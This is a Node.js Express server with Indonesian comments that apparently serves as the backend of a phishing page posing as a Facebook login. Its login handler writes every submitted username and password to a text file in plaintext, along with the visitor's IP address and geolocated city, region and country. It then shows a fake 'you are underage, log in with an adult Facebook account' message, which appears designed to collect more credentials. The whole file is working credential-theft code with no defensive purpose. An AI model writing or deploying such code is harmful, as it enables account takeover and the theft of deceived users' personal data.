const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const requestIp = require('request-ip');
const geoip = require('geoip-lite');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public'))); // Menyediakan akses ke file statis di direktori 'public'

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

app.post('/login', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    // Mendapatkan alamat IP pengguna
    const ip = requestIp.getClientIp(req);

    // Menemukan lokasi pengguna berdasarkan alamat IP
    const geo = geoip.lookup(ip);

    // Mengambil data lokasi pengguna
    const location = geo ? `${geo.city}, ${geo.region}, ${geo.country}` : 'Unknown';

    // Data yang akan disimpan ke dalam file
    const dataToWrite = `${username}:${password} - IP: ${ip}, Location: ${location}\n`;

    // Menyimpan data ke dalam file
    fs.appendFile('userdata.txt', dataToWrite, (err) => {
        if (err) {
            console.error('Error saving user data:', err);
            res.status(500).send('Internal Server Error');
        } else {
            console.log('User data saved successfully');
            res.status(200).send('Login selesai kamu belum cukup umur harap login facebook yang akun tanggal lahirnya berusia 18 tahun');
        }
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});
